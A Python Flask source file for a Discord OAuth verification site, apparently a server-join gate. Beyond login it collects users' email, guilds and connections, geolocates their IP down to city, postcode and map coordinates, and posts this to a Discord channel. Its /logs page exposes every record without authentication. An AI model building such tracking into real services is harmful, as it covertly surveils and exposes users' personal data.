# app.py
from flask import Flask, request, render_template
import requests, json, os, threading, time
from dotenv import load_dotenv
from datetime import datetime, timedelta
from discord_bot import bot
from user_agents import parse
import ipaddress

load_dotenv()
app = Flask(__name__)

ACCESS_LOG_FILE = "access_log.json"
GEO_CACHE_FILE = "geo_cache.json"
GEO_CACHE_TTL_DAYS = int(os.getenv("GEO_CACHE_TTL_DAYS", "7"))

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

# Optional: geopy / Nominatim for reverse geocoding (free)
try:
    from geopy.geocoders import Nominatim
    GEOPY_AVAILABLE = True
except Exception:
    GEOPY_AVAILABLE = False

# --- ヘルパー: プライベートIP判定 ---
def is_private_ip(ip_str):
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved
    except Exception:
        return False

# --- クライアントIP取得（公開IPを優先） ---
def get_client_ip():
    header_keys = [
        "X-Forwarded-For",
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "Forwarded",
    ]
    for key in header_keys:
        val = request.headers.get(key, "")
        if not val:
            continue
        parts = [p.strip() for p in val.split(",") if p.strip()]
        for p in parts:
            if p.startswith("for="):
                p = p.split("=",1)[1].strip('"')
            try:
                _ = ipaddress.ip_address(p)
            except Exception:
                continue
            if not is_private_ip(p):
                return p
    remote = request.remote_addr or ""
    if remote and not is_private_ip(remote):
        return remote
    # 最終手段: 外部サービスでパブリックIPを取得
    try:
        return requests.get("https://api.ipify.org", timeout=3).text.strip()
    except Exception:
        return remote or "0.0.0.0"

# --- キャッシュ操作 ---
def load_geo_cache():
    try:
        if os.path.exists(GEO_CACHE_FILE):
            with open(GEO_CACHE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_geo_cache(cache):
    try:
        with open(GEO_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

# --- Nominatim 逆ジオ（存在すれば使用） ---
def reverse_geocode_nominatim(lat, lon):
    try:
        if not GEOPY_AVAILABLE:
            return {}
        geolocator = Nominatim(user_agent="geo_fix_app", timeout=10)
        loc = geolocator.reverse(f"{lat}, {lon}", language="ja", exactly_one=True)
        if not loc or not loc.raw:
            return {}
        addr = loc.raw.get("address", {})
        # 'state'が都道府県、'city'/'town'/'village'等が市区町村
        pref = addr.get("state") or addr.get("region") or addr.get("county")
        city = addr.get("city") or addr.get("town") or addr.get("village") or addr.get("municipality") or addr.get("county")
        # いくつかは英語名になることもあるが、language="ja"で日本語を期待
        return {"prefecture": pref, "city": city, "raw": addr}
    except Exception:
        return {}

# --- 都道府県表記正規化（"東京" -> "東京都" など簡易補正） ---
PREF_CORRECTIONS = {
    "北海道": "北海道",
    "東京": "東京都", "東京府": "東京都",
    "京都": "京都府",
    "大阪": "大阪府",
    # 他は末尾に「県」を付ける方式（簡易）
}
def normalize_prefecture(name):
    if not name:
        return None
    name = name.strip()
    # 既に都道府県らしい語がある場合はそのまま
    for k,v in PREF_CORRECTIONS.items():
        if name.startswith(k):
            return v
    # 例: "神奈川" -> "神奈川県"
    if name.endswith(("都","道","府","県")):
        return name
    return name + "県"

# --- メイン: 複数無料ソースを使ってジオ情報を得る ---
def get_geo_info(ip):
    # キャッシュ確認
    cache = load_geo_cache()
    now = datetime.utcnow()
    if ip in cache:
        try:
            ts = datetime.fromisoformat(cache[ip].get("_cached_at"))
            if now - ts < timedelta(days=GEO_CACHE_TTL_DAYS):
                return cache[ip]["data"]
        except Exception:
            pass

    geo = {
        "ip": ip,
        "country": "不明",
        "region": "不明",  # 県
        "city": "不明",
        "zip": "不明",
        "isp": "不明",
        "as": "不明",
        "lat": None,
        "lon": None,
        "proxy": False,
        "hosting": False,
        "sources": [],
    }

    # 1) ipinfo.io (無料で基本情報取得可能) - region, city, loc
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
        if r.status_code == 200:
            j = r.json()
            geo["sources"].append("ipinfo")
            if j.get("country"):
                geo["country"] = j.get("country")
            if j.get("region"):
                geo["region"] = j.get("region")
            if j.get("city"):
                geo["city"] = j.get("city")
            if j.get("postal"):
                geo["zip"] = j.get("postal")
            if j.get("loc"):
                try:
                    lat, lon = j["loc"].split(",")
                    geo["lat"], geo["lon"] = float(lat), float(lon)
                except Exception:
                    pass
            # ipinfo may include org string like 'ASXXXX ISP'
            if j.get("org"):
                geo["isp"] = j.get("org")
    except Exception:
        pass

    # 2) ip-api.com (ISP, ASN, proxy/hosting に強い) - 補完用
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query",
            timeout=5,
        )
        j = r.json()
        if j.get("status") == "success":
            geo["sources"].append("ip-api")
            if j.get("country"):
                geo["country"] = geo["country"] if geo["country"] != "不明" else j.get("country")
            if j.get("regionName"):
                geo["region"] = geo["region"] if geo["region"] not in (None,"不明") else j.get("regionName")
            if j.get("city"):
                geo["city"] = geo["city"] if geo["city"] not in (None,"不明") else j.get("city")
            if j.get("zip"):
                geo["zip"] = geo["zip"] if geo["zip"] not in (None,"不明") else j.get("zip")
            if j.get("lat") and not geo["lat"]:
                geo["lat"] = j.get("lat")
            if j.get("lon") and not geo["lon"]:
                geo["lon"] = j.get("lon")
            if j.get("isp"):
                geo["isp"] = j.get("isp")
            if j.get("as"):
                geo["as"] = j.get("as")
            geo["proxy"] = bool(j.get("proxy", False))
            geo["hosting"] = bool(j.get("hosting", False))
            if j.get("query"):
                geo["ip"] = j.get("query")
    except Exception:
        pass

    # 3) ipapi.co fallback (追加の無料ソース) - 一部フィールド補完
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=4)
        if r.status_code == 200:
            j = r.json()
            geo["sources"].append("ipapi_co")
            if j.get("country_name") and geo["country"] in ("不明", None):
                geo["country"] = j.get("country_name")
            if j.get("region") and geo["region"] in ("不明", None):
                geo["region"] = j.get("region")
            if j.get("city") and geo["city"] in ("不明", None):
                geo["city"] = j.get("city")
            if j.get("postal") and geo["zip"] in ("不明", None):
                geo["zip"] = j.get("postal")
            if j.get("latitude") and not geo["lat"]:
                geo["lat"] = float(j.get("latitude"))
            if j.get("longitude") and not geo["lon"]:
                geo["lon"] = float(j.get("longitude"))
            if j.get("org") and geo["isp"] in ("不明", None):
                geo["isp"] = j.get("org")
    except Exception:
        pass

    # 4) 緯度経度が得られたら逆ジオ（Nominatim）で都道府県/市を日本語で補正
    if geo.get("lat") and geo.get("lon"):
        rg = reverse_geocode_nominatim(geo["lat"], geo["lon"])
        if rg:
            if rg.get("prefecture"):
                # 正規化（"東京" -> "東京都"等）
                pref = normalize_prefecture(rg.get("prefecture"))
                if pref:
                    geo["region"] = pref
            if rg.get("city"):
                geo["city"] = rg.get("city")

    # 最終正規化：空またはNoneを"不明"に
    for k in ["country", "region", "city", "zip", "isp", "as"]:
        if geo.get(k) in (None, ""):
            geo[k] = "不明"

    # キャッシュに保存
    try:
        cache[ip] = {"_cached_at": datetime.utcnow().isoformat(), "data": geo}
        save_geo_cache(cache)
    except Exception:
        pass

    return geo

# --- ログ保存 ---
def save_log(discord_id, structured_data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    structured_data["timestamp"] = now
    logs[discord_id]["history"].append(structured_data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# --- ルート: 認証ページ ---
@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code"
        f"&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

# --- コールバック ---
@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections",
    }

    try:
        res = requests.post(token_url, data=data, headers=headers, timeout=8)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth, timeout=6).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth, timeout=6).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth, timeout=6).json()

    # サーバー参加（Bot権限がある場合）
    try:
        requests.put(
            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
            headers={
                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
                "Content-Type": "application/json",
            },
            json={"access_token": access_token},
            timeout=6,
        )
    except Exception:
        pass

    # --- IP / UA --- 
    ip = get_client_ip()
    if is_private_ip(ip):
        try:
            ip = requests.get("https://api.ipify.org", timeout=3).text.strip()
        except Exception:
            pass

    geo = get_geo_info(ip)
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
        if user.get("avatar")
        else "https://cdn.discordapp.com/embed/avatars/0.png"
    )

    structured_data = {
        "discord": {
            "username": user.get("username"),
            "discriminator": user.get("discriminator"),
            "id": user.get("id"),
            "email": user.get("email"),
            "avatar_url": avatar_url,
            "locale": user.get("locale"),
            "verified": user.get("verified"),
            "mfa_enabled": user.get("mfa_enabled"),
            "premium_type": user.get("premium_type"),
            "flags": user.get("flags"),
            "public_flags": user.get("public_flags"),
            "guilds": guilds,
            "connections": connections,
        },
        "ip_info": geo,
        "user_agent": {
            "raw": ua_raw,
            "os": ua.os.family,
            "browser": ua.browser.family,
            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
            "is_bot": ua.is_bot,
        },
    }

    save_log(user["id"], structured_data)

    # Discord通知
    try:
        d = structured_data["discord"]
        ip_info = structured_data["ip_info"]
        ua_info = structured_data["user_agent"]

        embed_data = {
            "title": "✅ 新しいアクセスログ",
            "description": (
                f"**名前:** {d['username']}#{d['discriminator']}\n"
                f"**ID:** {d['id']}\n"
                f"**メール:** {d['email']}\n"
                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
                f"**IP:** {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}\n"
                f"**国:** {ip_info['country']} / {ip_info['region']} / {ip_info['city']} / {ip_info['zip']}\n"
                f"**ISP:** {ip_info['isp']} / AS: {ip_info['as']}\n"
                f"**UA:** {ua_info['raw']}\n"
                f"**OS:** {ua_info['os']} / ブラウザ: {ua_info['browser']}\n"
                f"**デバイス:** {ua_info['device']} / Bot判定: {ua_info['is_bot']}\n"
                f"📍 [地図リンク](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})"
            ),
            "thumbnail": {"url": d["avatar_url"]},
        }

        bot.loop.create_task(bot.send_log(embed=embed_data))

        if ip_info["proxy"] or ip_info["hosting"]:
            bot.loop.create_task(
                bot.send_log(
                    f"⚠️ **不審なアクセス検出**\n"
                    f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
                    f"IP: {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}"
                )
            )

        bot.loop.create_task(bot.assign_role(d["id"]))

    except Exception as e:
        print("Embed送信エラー:", e)

    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])

# --- ログ表示 ---
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)

# --- BOT起動 ---
def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    # 起動時にキャッシュを初期化（ファイル読み込み）
    cache = load_geo_cache()
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
